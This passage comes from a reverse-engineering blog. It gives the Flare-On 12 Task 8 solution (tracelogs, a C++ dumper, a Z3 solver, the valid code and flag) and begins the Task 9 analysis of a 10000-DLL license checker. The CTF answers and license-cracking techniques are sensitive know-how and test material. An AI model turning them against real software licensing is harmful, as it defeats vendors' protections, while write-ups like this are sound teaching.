|  | rax = 0xc60a7f3; |
|  | rax = 0x716c0d7; |
|  | rax = 0x32c5f65; |
|  | rax = 0xb49d7af; |
|  | rax = 0x1b186d3; |
|  | rax = 0x545d8d5; |
|  | rax = 0x6b2f406; |
|  | rax = 0x9a868c; |
|  | rax = 0x7024229; |
|  | rax = 0x48bdaae; |
|  | rax = 0x5f8f14f; |
|  | rax = 0x9d5d059; |
|  | rax = 0xdc0222f; |
|  | rax = 0x3d1d2b6; |
|  | rax = 0xd63209a; |
|  | rax = 0xb3c02cb; |
|  | rax = 0x6fb781e; |
|  | rax = 0xf2d7eee; |
|  | rax = 0xca922ea; |
|  | rax = 0xadf00df; |
|  | rax = 0x4775803; |

[view raw](https://gist.github.com/hasherezade/d18a5d418c2989411beab97e6976d0b8/raw/966ed5da26ac91a545ffad69a9d0787e67173537/field_id_table.txt) [field\_id\_table.txt](https://gist.github.com/hasherezade/d18a5d418c2989411beab97e6976d0b8#file-field_id_table-txt)
hosted with ❤ by [GitHub](https://github.com/)

However, the second call to `get_translated` is more problematic. This time the output depends not just on the index, but also on the input. For each 25 indexes there are 10 possible input characters (0 to 9).

Let’s dump it using (`FlareAuthenticator.exe.disasm_range.csv`):

|     |     |
| --- | --- |
| 1 | `16766,16768,get_translated2` |

After dumping arguments to the second call we can see what exactly is passed as an input to the second call (in RDX). Tracelog fragment below:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14 | ```{ [rsp] -> 0x2f9935a5e8; rdi = 0x2f9935a9e0; rsi = 0x2; rbp = 0x2f99359ad0; rsp = 0x2f99359a50; rbx = 0x2f9935a5e8; rdx = 0x131; rcx = 0x2f9935fd20; rax = 0x7ff616221760; r8 = 0x64ed705730bc6591; r9 = 0x31; r10 = 0x131; r11 = 0xffffffff; r12 = 0x2f9935a6a8; r13 = 0x2f9935a4f8; r14 = 0x2f9935a4c8; r15 = 0x2f9935a9c8; flags = 0x217 [ C=1 P=1 A=1 I=1 ]; }`<br>`16766;[0] call rax # disasm start: get_translated2`<br>```{ rdx = 0x60656c99e9c3cadd; rcx = 0x0; rax = 0x6235f14; r8 = 0xc53fbd32de138089; r9 = 0x3ac042cd21ec7f77; r10 = 0x4; r11 = 0xfffffffd; flags = 0x202 [ C=0 P=0 A=0 ]; }`<br>`[...]`<br>```{ rdx = 0x232; rcx = 0x2f9935fd20; rax = 0x7ff616221760; r8 = 0x64ed705730bc6591; r9 = 0x32; r10 = 0x232; r11 = 0xffffffff; flags = 0x217 [ C=1 P=1 A=1 ]; }`<br>`16766;[0] call rax # disasm start: get_translated2`<br>```{ rdx = 0x60656c99e9c3cadd; rcx = 0x0; rax = 0x806e2b; r8 = 0xc53fbd32de138089; r9 = 0x3ac042cd21ec7f77; r10 = 0x4; r11 = 0xfffffffd; flags = 0x202 [ C=0 P=0 A=0 ]; }`<br>`[...]`<br>`//last chunk:`<br>```{ rdx = 0x1934; rcx = 0x2f9935fd20; rax = 0x7ff616221760; r8 = 0x64ed705730bc6591; r9 = 0x34; r10 = 0x1934; r11 = 0xffffffff; flags = 0x217 [ C=1 P=1 A=1 ]; }`<br>`16766;[0] call rax # disasm start: get_translated2`<br>```{ rdx = 0x60656c99e9c3cadd; rcx = 0x0; rax = 0x5c643be; r8 = 0xc53fbd32de138089; r9 = 0x3ac042cd21ec7f77; r10 = 0x4; r11 = 0xfffffffd; flags = 0x202 [ C=0 P=0 A=0 ]; }` |

The second argument of `get_translated` (after the obj) can be found in RDX. What we can read in the tracelog:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | `rdx = 0x131 (iteration: 1, input[0] = '1' = 0x31)`<br>`rdx = 0x232 (iteration: 2, input[1] = '2' = 0x32)`<br>`[...]`<br>`rdx = 0x1934 (iteration: 0x19 = 25, input[24] = '4' = 0x34)` |

When observed across different tracing sessions, we can see the pattern:

|     |     |
| --- | --- |
| 1 | `arg1 = ((i + 1) * 0x100) | input[i]` |

We know that at the end of the chunk processing, the output of the above call to `get_translated` will be multiplied with the result of the previous call to the same function. That means, we can as well dump the ready-made products for each input/index combination. Example (the output is in RAX):

Ranges (`FlareAuthenticator.exe.disasm_range.csv`):

|     |     |
| --- | --- |
| 1 | `16772,16776,mul_product` |

Tracelog fragment:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8 | ```{ rdx = 0x1933; rcx = 0x30ff94f8d0; rax = 0x7ff616221760; r8 = 0x64ed705730bc6591; r9 = 0x33; r10 = 0x1933; r11 = 0xffffffff; flags = 0x217 [ C=1 P=1 A=1 ]; }`<br>`16766;[0] call rax # disasm start: get_translated2`<br>```{ rdx = 0x60656c99e9c3cadd; rcx = 0x0; rax = 0x1e2ab7f; r8 = 0xc53fbd32de138089; r9 = 0x3ac042cd21ec7f77; r10 = 0x4; r11 = 0xfffffffd; flags = 0x206 [ C=0 A=0 ]; }`<br>`16768;[0] mov rcx, rax # disasm end: get_translated2`<br>```{ rcx = 0x1e2ab7f; rax = 0x4775803; }`<br>`16772;[0] imul rax, rcx # disasm start: mul_product`<br>```{ rax = 0x86bb1a4a4aa7d; }`<br>`16776;[0] mov qword ptr [rbp+0x348], rax # disasm end: mul_product` |

# Dumping the values

Dumping all possible values requires the function `get_translated` to be called 250 times, so of course it has to be done by some script. This function has the following prototype:

|     |     |
| --- | --- |
| 1 | `__int64``__fastcall get_translated (QObject*,``__int64``);` |

When calling function from an exe is required, I usually do it by exporting the function from the original binary, and using it in my own loader. It can be done by converting the executable to a DLL (using [exe\_to\_dll utility](https://github.com/hasherezade/exe_to_dll)), or with the help of [libPEConv](https://github.com/hasherezade/libpeconv).

But in this case I was concerned about the first argument: QObject. So far my knowledge on what this object represents is just approximated. I don’t really know how it has to be laid out, so reconstructing it to use in the independent loader may cause problems. But I made a quick experiment in x64dbg, and set the value of this argument to NULL. The function didn’t crash, and it gave the expected value as an output. It means, we can safely skip it. Conversion of the original EXE to DLL also was successful (result [here](https://github.com/hasherezade/flareon2025/tree/main/task8/dumper/bin)). It means we are ready to import the function. We will just use its simplified prototype, and its RVA known from IDA (`0x81760`).

This is the tiny dumper that I wrote:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38 | `#include <windows.h>`<br>`#include <iostream>`<br>`#include <string>`<br>`#define FUNC_OFFSET 0x81760`<br>`__int64``__fastcall get_translated (``void``*,``__int64``);`<br>`int``main(``int``argc,``char``* argv[])`<br>`{`<br>```const``char``* dll_name =``"FlareAuthenticator.dll"``;`<br>```HMODULE``mod = LoadLibraryA(dll_name);`<br>```if``(!mod) {`<br>```std::cout <<``"Failed to load the DLL: "``<< dll_name << std::endl;`<br>```return``1;`<br>```}`<br>```ULONG_PTR``func_ptr = (``ULONG_PTR``)mod + FUNC_OFFSET;`<br>```auto``_get_translated =``reinterpret_cast``<``decltype``(&get_translated)>(func_ptr);`<br>```for``(``size_t``dig = 0; dig < 10; dig++) {`<br>```std::cout <<``"#Digit: "``<< dig << std::endl;`<br>```std::cout <<``"["``<< std::endl;`<br>```for``(``size_t``pos = 1; pos <= 25; pos++) {`<br>```char``inp = dig +``'0'``;`<br>```WORD``arg = inp | (0x100 * pos);`<br>```uint64_t``val0 = _get_translated(``nullptr``, pos);`<br>```uint64_t``val1 = _get_translated(``nullptr``, arg);`<br>```std::cout << std::hex <<``"0x"``<< val0 * val1;`<br>```if``(pos != 25) std::cout <<``", "``;`<br>```if``((pos % 5) == 0) std::cout <<``"\n"``;`<br>```}`<br>```std::cout <<``"]"``;`<br>```if``(dig < 9) std::cout <<``", "``;`<br>```std::cout << std::endl;`<br>```}`<br>``<br>```return``0;`<br>`}` |

And the result (complete listing can be found [here](https://github.com/hasherezade/flareon2025/blob/main/task8/dumper/out/out.txt)):

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9 | `#Digit: 0`<br>`[`<br>`19b3240445aa06, 6f63394844df78, 6df6a4586e71c0, 4ea15fc542c9c0, 3ac57453ace252,`<br>`6402164c9fdb19, 69b5253875b96, 9c0d47eac35d2d, 30b9da3c1bfe7, 3a03c1d1d02f29,`<br>`1d392355df459c, 8484a22a795e4, be331dd3107ad, 19c7c11da4e4a2, 1796e76685e997,`<br>`9bdc1f78073127, cce53b2df56140, 1dc6931c286db2, 139d946e9d6d82, 72a31cfde71ef6,`<br>`40a5db3578d586, c427156a9e2860, 537869c92a42d0, 8cc856e432bc50, 20ccd008ad41a`<br>`]`<br>`[...]` |

# Crafting and solving the final equation

At this point we have the intermediate results dumped, and the reconstructed equation can be simplified to the following form:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16 | `bool``is_valid =``false``;`<br>`uint64_t``result = 0;`<br>`for``(``size_t``i = 0; i < 25; i++) {`<br>```// inp[i] is digit 0..9`<br>```uint64_t``new_res = dumped_table[inp[i]][i];``// [digit][pos]`<br>```uint64_t``operant_res2 = new_res + result;`<br>```uint64_t``operant_res3 = (~new_res | ~result) + operant_res2 + 1;`<br>```uint64_t``tmp = operant_res2 - (new_res | result);`<br>```result = (operant_res3 | tmp) + (operant_res3 & tmp);`<br>`}`<br>`if``(result == 0xBC42D5779FEC401ULL)`<br>```is_valid =``true``;` |

Still, the operations at the end can be simplified. Again, we can log those values with TinyTracer, and see what they really are.

By logging `result` and `new_res` for several iterations, we can see that the complicated bitwise expression is equivalent to a simple 64-bit addition, so we can safely replace it with the form below.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6 | `bool``is_valid =``false``;`<br>`uint64_t``result = 0;`<br>`for``(``size_t``i = 0; i < 25; i++) {`<br>```result += dumped_table[inp[i]][i];`<br>`}`<br>`is_valid = (result == 0xBC42D5779FEC401ULL);` |

Finally, it is the time to implement [the Z3 solver](https://github.com/hasherezade/flareon2025/tree/main/task8/z3_solver) :

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37 | `from``z3``import``*`<br>`digit_constants``=``[`<br>`# digit_constants[d][pos] : dumped 10x25 table`<br>`]`<br>`NUM_POS``=``25`<br>`NUM_DIGIT``=``10`<br>`target``=``0xBC42D5779FEC401`<br>`s``=``Solver()`<br>`# unknown digits d[0..24]`<br>`digits``=``[``Int``(f``"d{i}"``)``for``i``in``range``(NUM_POS)]`<br>`for``d``in``digits:`<br>```s.add(d >``=``0``, d < NUM_DIGIT)`<br>`# contrib[pos] = digit_constants[digits[pos]][pos]`<br>`contribs``=``[]`<br>`for``pos``in``range``(NUM_POS):`<br>```term``=``IntVal(``0``)`<br>```for``dig``in``range``(NUM_DIGIT):`<br>```term``=``If(digits[pos]``=``=``dig,`<br>```IntVal(digit_constants[dig][pos]),`<br>```term)`<br>```contribs.append(term)`<br>`total``=``Sum``(contribs)`<br>`s.add(total``=``=``target)`<br>`print``(``"Solving..."``)`<br>`if``s.check()``=``=``sat:`<br>```m``=``s.model()`<br>```sol``=``[m[d].as_long()``for``d``in``digits]`<br>```print``(``"Code:"``, "".join(``str``(x)``for``x``in``sol))`<br>`else``:`<br>```print``(``"No solution"``)` |

And the solver’s output:

|     |     |
| --- | --- |
| 1<br>2 | `Solving...`<br>`Code: 4498291314891210521449296` |

It turns out to be the valid code!

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/flag_out.png?w=637)`s0m3t1mes_1t_do3s_not_m4ke_any_s3n5e@flare-on.com`

Posted in [CrackMe](https://hshrzd.wordpress.com/category/crackme/), [CTF](https://hshrzd.wordpress.com/category/ctf/), [FlareOn](https://hshrzd.wordpress.com/category/ctf/flareon/)\|Tagged [ExeToDLL](https://hshrzd.wordpress.com/tag/exetodll/), [FlareOn](https://hshrzd.wordpress.com/tag/flareon/), [FlareOn12](https://hshrzd.wordpress.com/tag/flareon12/), [TinyTracer](https://hshrzd.wordpress.com/tag/tinytracer/)\|[1 Comment](https://hshrzd.wordpress.com/2025/11/25/flare-on-12-task-8/#comments)

## [Flare-On 12 – Task 9](https://hshrzd.wordpress.com/2025/11/20/flare-on-12-task-9/)

Posted on [November 20, 2025](https://hshrzd.wordpress.com/2025/11/20/flare-on-12-task-9/ "6:07 am") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

_In this mini-series I describe the solutions of my favorite tasks from this year’s [Flare-On competition](https://flare-on12.ctfd.io/scoreboard). To those of you who are not familiar, [Flare-On](https://flare-on.com/) is a marathon of reverse engineering. This year it ran for 4 weeks, and consisted of 9 tasks of increasing difficulty. Collection of my sourcecodes created in the process of solving can be found in my Github repository [flareon\_2025](https://github.com/hasherezade/flareon2025)._

Task 9 was the last one, and it came with a significant increase in the difficulty level compared to the earlier tasks.

SHA256 of the executable: `785a6e2bb7ce9685afe80589bbc7e28b1676e003b0041e1f74e4984044a4e551`.

# Overview

## PE-bear

The file is a 64-bit Windows PE. Since the very first look we can see that it is quite big: `1.07 GB`. When we run it from command-line, we get:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_running.png?w=296)

I started by opening it in PE-bear. We can spot that the `.rsrc` section takes the majority of space.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_res.png?w=731)

The natural next step in this situation would be to see the list of the resources. At first, PE-bear showed me only 50 entries in the resources directory (due to a hard-limit set in code, that is now removed; in reality there are 10000 of them). It is clear from the first look that the resources are compressed PE files. The pattern starting the header looked familiar to me from malware analysis: it is `M8Z` – which suggests compression with [aPlib](https://ibsensoftware.com/products_aPLib.html).

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_resources_1.png?w=725)

It can be decompressed with a Python script using [`malduck` library](https://github.com/CERT-Polska/malduck) (example [here](https://github.com/hasherezade/flareon2025/blob/main/task9/dump_dlls/aplib_decompress.py)).

## IDA

Before proceeding further I decided to take a look in IDA.

The PE files from the resources are indeed loaded, and manually mapped:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_libs_load.png?w=659)

The function that loads the PEs (renamed to `pass_Buffer1_and_load_libs`) occurs in the function responsible for checking the license, and is called in the loop 10000 times.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_call_the_loop.png?w=825)

This shed light on why the executable is named `10000.exe` : it carries inside 10000 of different DLLs.

## Extracting DLLs

After removing the hardcoded limit PE-bear was able to see all the DLLs, and dump them into a selected directory. Decompressed the full directory content with the help of the following script:

\+ [`aplib_decompress.py`](https://github.com/hasherezade/flareon2025/blob/main/task9/dump_dlls/aplib_decompress.py)

As a result I obtained 10000 DLLs, with the export tables similar to the following:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_dll_exports.png?w=695)

Each DLL has a long list of entries with mangled names. Two distinct types appear. There are multiple functions with a name like \_Z21f00155255799705906783Ph ( format: `_Z21f{number}Ph`) – for simplicity, they will be referenced as “f” functions. In addition to it, each DLL has exactly only one “check” function (`_Z5checkPh`) .

The real names of the DLLs are stored in the Export Table, so, with the help of another script, using `pefile` I renamed them to the stored names.

\+ [rename\_dlls.py](https://github.com/hasherezade/flareon2025/blob/main/task9/dump_dlls/rename_dlls.py)

The DLLs are not just independent units. They may import each other:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_imports.png?w=808)

As we can see, they use for it simplified version of their names – without the “.real.” part. So, in order to keep it consistent, I made a little cleanup script, that walks though all the DLLs and rename them accordingly:

\+ [remove\_name\_part.py](https://github.com/hasherezade/flareon2025/blob/main/task9/dump_dlls/remove_name_part.py)

As a result we have all DLLs: from 0000.dll to 9999.dll stored in a directory. That is in total around 4 GB of data.

# Understanding the flow

As the initial overview already revealed, the task is about checking some license file. At this point we have several questions to answer:

1. What is the expected format of the license file?
2. What is the condition that makes the license correct?
3. How does it connect to the DLLs that we just obtained?

The code of this challenge is not obfuscated, so it is relatively easy to follow. Most important actions happen in the function at VA = `0x140001e87` denoted as `verify_license`.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_verif.png?w=836)

Analyzing the code of the following function, few things come to light.

- The license is supposed to be stored in the file license.bin, in the same directory as the task
- Its size is exactly 0x53020 bytes
- the content is read into a buffer, and SHA256 hash is calculated first. This hash will be used at the end.
- The license consists of 10000 chunks. Each of them is 34 bytes long. The first WORD of the chunk must be not greater than 9999. It is an index, used to decide what DLL should be used for the verification of that chunk. The appropriate DLL is fetched from the resources, and manually loaded. Then, the function “check” (mangled \_Z5checkPh) is called, with the current chunk passed as an argument. If the chunk verification failed, the loop exits with an error.
- Each iteration causes an update of another, global buffer. This buffer is then compared with the hardcoded one using simple `memcmp`. If the comparison fails, the application exits with an error.
- If all the steps passed, the license is accepted. The previously calculated SHA256 of the license is used to decrypt the flag.

There are still some more details to figure out, but at this point we can answer the 3 basic questions:

1\. What is the expected format of the license file?

- The license is expected to be exactly 0x53020 bytes long. It consists of 10000 chunks. Each chunk contains (1+16) WORDs, meaning it is 34 bytes long.

- The first WORD of the chunk denotes the ID (0–9999) of the DLL that will be used for its verification. The remaining 32 bytes are the content passed to the “`check`” function. The chunk is correct if the “check” function returned TRUE.

2\. What is the condition that makes the license correct?

- The license must be filled with chunks that pass verification with each of the 10000 DLLs. However, the order in which the verification is performed also matters, and is unknown so far. The order of the DLLs depends on the first WORD of the chunk – so it is not just the index of the loop iteration.

3\. How does it connect to the DLLs that we just obtained?

- Each DLL is used to verification of a single chunk of the license. The “check” function from the DLL is fetched and called on the buffer, and is supposed to return TRUE.

# Loading a single DLL

I decided that it will be easier if I divide the problem on sub-problems, and make a loader that can run a selected “check” function from an individual DLL. At first, it looked straight-forward: just use the `LoadLibrary` function to load a particular module, then `GetProcAddress` to select the “check” function, and run it on a buffer with the data…

But something was clearly wrong – in some cases, the DLL was crashing instead of giving the output. Following execution under the debugger I found the reason. The “check” function calls multiple “f” functions – it may be from itself, or other DLLs. At the beginning of each “f” function, a global buffer is referenced, and the first DWORD of the input buffer is XORed with the DWORD pointed.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/in_f_func.png?w=711)

I realized that it points to DLL\_base + \[some offset\]. The offset is different for each DLL, and sometimes goes beyond the size of one page (0x1000) – so it was clearly not intended to read from the module header. This looked weird at first, unless I checked how the original DLL is actually initialized.

In the original executable of the task, each DLL is loaded manually. So, the `DllMain` is also called in a custom way:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_call_dll_main.png?w=1024)

In case of a normal DLL load, the first argument passed is the DLL base – but here, the passed buffer was always the same (which I denoted as `g_Buf1`), located inside the main executable. That means it is a shared global buffer, used to exchange some information across different DLL runs.

This buffer is 10000 DWORDs long, and initially empty.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_gbuf.png?w=730)

This fact disrupts loading the DLL by LoadLibrary – we have no influence on the parameters that are passed to DllMain along the line.

We could of course still load the DLL by a custom loader, for example using libraries such as [libPEconv](https://github.com/hasherezade/libpeconv) – but it doesn’t really give the same benefits during debugging. The DLL will be loaded in a private space, and not treated as a module, so we can’t i.e. set breakpoints at particular functions relative to the module base.

Then I came up with a much simpler idea, and decided to call the DllMain of all the relevant DLLs for the second time. First, I load the DLL of my interest by `LoadLibraryA`. This causes all the dependencies to load automatically – some of which are other DLLs belonging to the challenge. Once the loading completed, I walk through all the modules in memory (using `Module32FirstW` – `Module32NextW` ), and check if the module name matches the numerical pattern. If so, I fetch its DllMain (using Entry Point in the header), and call it manually, this time passing the pointer to my own buffer instead of DLL\_base. Thanks to this, the internal pointers to the g\_Buf1 in each DLL get updated, no longer pointing the DLL\_base, but the buffer of my choice. And the DLL is ready to be used as a standalone unit.

Full code of the used loader is available in the relevant Github repository \[ [here](https://github.com/hasherezade/flareon2025/tree/main/task9/loader)\]

Plugging the custom g\_Buf1 into the loader allowed me to run DLLs independently, and check how the input is transformed:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/before_and_after.png?w=789)

Of course it is not enough to pass the check, but it will be very helpful in testing the correctness of the further steps that we will implement, without always needing to run the bulky EXE.

# The role of Global Buffer (g\_Buf1)

By analyzing how the DLL is loaded we noticed that some information between each check is passed by a global buffer (renamed to g\_Buf1). A value from this buffer, at offset relevant to the particular DLL name, is used in the chunk processing – so, it order to have the chunk check resolved properly, we need to know what exactly was passed.

The buffer is initially empty. But at the end of processing, if all chunks are verified properly, it is compared by `memcmp` with another, non-empty, hard-coded buffer (referenced as a Validation Buffer: `g_ValidBuf`). That means that we need to recreate the conditions, under which, during the processing of all chunks, the Global Buffer will be filled with the same content as Validation Buffer. That leads to another question: how and when is this buffer filled?

The Global Buffer is referenced in 4 places:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/refs.png?w=387)

First, reference, that we already saw earlier, is in the function that manually loads the DLL. At that point, the buffer is just passed to the manually called dll\_main. Another known reference (the first from the bottom) is in the verify\_license function – where the comparison with Validation Buffer is made. There are two middle references that we didn’t explore yet, inside the function that I denoted as `add_stuff_to_Buffer1`. This function is called in the loop that is responsible for checking a single chunk of the license. It has one argument, that is an index of the iteration (not to be confused with the index of the DLL).

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/add_to_buf.png?w=631)

This function iterates over a vector, and uses it to resolve at what position the current index will be added.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/gbuf_add.png?w=624)

This vector is created at the DLL load, and contains all the manually loaded DLLs that are available at the current time. It contains elements of the structure that is used to keep track on the manually loaded buffers. Each element contains the DLL id (that is the same as the ID of the resource from which the DLL was loaded: resID). Fragment of this logic presented below:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/storing_manual_buf.png?w=640)

Now, this resource ID is mapped to the DWORD in the g\_Buf1. This means: the currently checked DLL and all its recursive dependencies are representing fields of the `g_Buf1` where the index of the current iteration will be added.

This knowledge will be helpful in reconstructing the order of the DLL loads. Once we know the proper order, that allows to recreate Validation Buffer, we know how to fill the first DWORD of each chunk.

But before we dive into this part, let’s have a look how the rest of the chunk is validated.

# The “check” function

The prototype of the “check” function is very simple. It takes the pointer to a 32-byte long chunk.

|     |     |
| --- | --- |
| 1 | `int check(BYTE* chunk);` |

The “check” function in each DLL is structured following the same template. Let’s start by getting a general overview of what is going on. Our goal is to use what we learned by analyzing this function to reconstruct the corresponding chunk in a way that it will pass the verification.

First, there are multiple calls to the “f” functions. The referenced functions can be from the current DLL, or from any of the imported ones. Each call to the “f” function transforms a chunk in some way.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/f_funcs_part.png?w=311)

The detailed analysis of this part will be described further in this blog.

After this preprocessing, there comes the part of the task that requires more advanced math knowledge.

## Matrix exponentiation and its inverse

The second part of the check seems complicated. I decided to use AI to get the explanation of what exactly is going on. It turns out that this is a key verification, using modular matrix exponentiation.

The pseudo-code that I obtained from one of the analyzed DLLs:

```

/***************************************************************
 *  check(chunk : byte *)  →  bool
 *
 *  Validates ‟chunk” against a baked-in public key / signature.
 *  The code is heavily obfuscated, but when cleaned up it becomes:
 *
 *      Step 0  – run a pipeline of reversible scramblers on chunk
 *      Step 1  – build a 16-element vector  V  from chunk
 *      Step 2  – ensure every element of V is < P
 *                (P is a prime)
 *      Step 3  – compute a long chain of modular operations
 *                (lots of   a·b  mod P)
 *      Step 4  – if the final scalar  s  is 0   ⇒  reject
 *      Step 5  – raise a 4×4 matrix  M  to a 64-bit exponent e
 *                (again mod P)
 *      Step 6  – compare the resulting 4×4 matrix with a baked
 *                constant reference; return true when equal.
 *
 *  That is exactly what RSA-PKCS-1 style “textbook signature
 *  verification” looks like once flattened by a compiler and
 *  obfuscated by a packer.
 ****************************************************************/

function check(chunk : pointer to uint8) returns bool
{
    /********************  STEP 0 – scramble the input  ********************/
    for  f in HUGE_PILE_OF_HELPERS                      // 200+ calls
        f(chunk)                                        // reversible mixers / S-boxes

    /********************  STEP 1 – build initial vector  ******************/
    V[0‥15]  ← read16BigEndianQwords(chunk)             // two qwords per limb

    /********************  STEP 2 – range-check against prime P  ***********/
    P  ← 0xDC37C0E3 04978087 594B7F91 F11228E5          // 127-bit prime
    for i in 0‥15
        V[i]  ← V[i]  xor  chunk_qword[(i mod 4)]       // small secret tweak
        if V[i] ≥ P                                     // any limb ≥ P  ⇒  reject
            return false

    /********************  STEP 3 – massive modular arithmetic  ************/
    /*
       From here to the next comment the code is nothing but
       sequences like

          tmp   = (A * B) mod P
          A     = (tmp * C) mod P
          …
       where P is always the same prime and  A,B,C are 128-bit
       intermediates.  The compiler emitted calls to the helper
       “unsigned_modulus()” we reverse-engineered earlier.

       The net effect is:
           s =  complicated_function(V, built-in constants)  mod P
     */
    s = complicatedScalarComputation(V, P)              // ≈400 lines in IDA listing

    /********************  STEP 4 – reject when s == 0  ********************/
    if s == 0
        return false                                    // invalid input

    /********************  STEP 5 – modular-matrix exponentiation  *********/
    /*
       A 4 × 4 matrix  M  (elements mod P) is assembled from the
       current scratch area.  Then a classic square-and-multiply
       is performed with exponent e = 0x594B7F91F11228E5.

       Only the bit positions set in e trigger a matrix multiply,
       hence the ‟if ((e >> k) & 1)” branch inside two nested 4×4
       loops you saw in the disassembly.
     */
    M      ← matrixFrom(V)          // 4×4, limbs are 128-bit ints mod P
    e      ← 0x594B7F91F11228E5
    Result ← IdentityMatrix(4)

    for bit = 0 .. 63
        if (e >> bit) & 1
            Result = (Result × M) mod P
        M = (M × M) mod P           // always square (Montgomery ladder)

    /********************  STEP 6 – compare with golden reference  ********/
    Golden[4][4] =
    [\
      0x65DE31EF76B34C5E, 0xBF9224AA780960BA, 0x944C61FE664D8A46, 0x85FFAACD31F816D1,\
      0x5FE739DE69B61B49, 0x4362AB9DFD8274E5, 0xC90B9E6AC29A84EC, 0x661807122A7615D7,\
      0x2367A1BF2B936D7C, 0x289E160527983DEF, 0xB0E4B274464C4BFD, 0x5222046DFEF7B826,\
      0x6158769ED8530622, 0x056EABD584B51A70, 0xA5B7C08151FFACE8, 0xC7B8D0A6D71A6E00\
    ]

    /*
       The SIZE[] table you saw (1,0…0,1,0…0…) is just the list
       of ‟valid” bytes in Golden that must be compared; the rest
       is padding turned to zero by memset().
    */
    if memcmp_masked(Result, Golden, Size) == 0
        return true
    else
        return false
}

/****************************************************************
 * Helper  – compares only the bytes whose corresponding Size[i]
 *           entry is 1.  (Exactly what the memset/Size[] dance
 *           in the assembly achieves.)
 ****************************************************************/
function memcmp_masked(a, b, Size[]) returns int
{
    for idx = 0 .. (sizeof(Size)-1)
        if Size[idx] == 1 and a[idx] ≠ b[idx]
            return ‑1
    return 0
}
```

It may be confusing at first why AI mapped those arguments as 128-bit, but looking how they are mapped in memory reveals that the rest is just a padding:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/128_int.png?w=578)

To understand the whole implementation better I reconstructed this part in C/C++. Snippet [here](https://github.com/hasherezade/flareon2025/blob/main/task9/operations/matrix_exp.h).

Because the exponent `e` and modulus `P` are known constants, and the operations are deterministic, this transformation can be inverted: meaning that given the final matrix, we can compute the required pre-image. So this is how we will further approach solving this part.

To implement the inverse, once again I used the power of AI, and this time Python (because the solution requires access to bigint library, and it works seamlessly in Python).

The snippet that I used for testing the complete reverse of a single chunk is available [here](https://github.com/hasherezade/flareon2025/tree/main/task9/scripts).

## The “f” functions

In order to revert the whole check, and obtain the initial buffer, we still need to understand the first part of the check function, which is a block of calls to different “f” function. Although their volume may be intimidating, in fact there are only 3 types of “f” functions. What differs between them are the hard-coded arguments.

I started by reimplementing each type, and making their arguments external rather than internal.

Example:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/f_type2.png?w=713)

Reimplemented:

```
BYTE* f_type2(BYTE* arg1, size_t dll_id, const uint64_t kQargs[33])
{
    DWORD* arg1_d = (DWORD*)arg1;
    DWORD* verif = (DWORD*)g_Buffer1;
    arg1_d[0] ^= verif[dll_id];

    for (size_t i = 0; i <= 31; ++i)
    {
        arg1[i] = *((BYTE*)kQargs + arg1[i]);
    }
    return arg1;
}
```

The snippet illustrating all types is available in the relevant GitHub repository, [here](https://github.com/hasherezade/flareon2025/blob/main/task9/operations/ffuncs.h).

I passed my reconstructed code to GPT Chat, and prompted it to invert those functions. The result that I’ve got worked very well. It can be found [here](https://github.com/hasherezade/flareon2025/blob/main/task9/operations/inverse.h).

Summing up, we reached the conclusion that all operations done in the “check” can be fully inverted, and the buffer that is used at the end for the chunk verification, can be used for chunk reconstruction.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/final_check.png?w=653)

The biggest problem to solve now is, how to extract all the needed arguments from each function, to make chunk recovery at scale?

# Parsing DLLs

This is one of the most tedious part of this task, but it can’t be avoided. We have to parse all the 10000 DLLs, one by one, extract their arguments, and store for further use.

Since this task requires parsing a massive amount of data, I decided that instead of doing it with a Python script, I would use a native compiled application.

I already have a utility that could easily become a base. It is a simple, multiplatform command-line disassembler based on [bearparser](https://github.com/hasherezade/bearparser) and [capstone](https://github.com/capstone-engine/capstone/). It can be found [here](https://github.com/hasherezade/beardisasm/tree/master/disasm-cli). The utility loads a given PE file, and dumps disassembly of the function with a supplied name. It automatically applies information found in the PE structure. For example, it resolves imported functions. This is important in our case – we will not only operate on a raw assembly. We also have to make a list of all “f” functions needed for each “check” function, and their sequence.

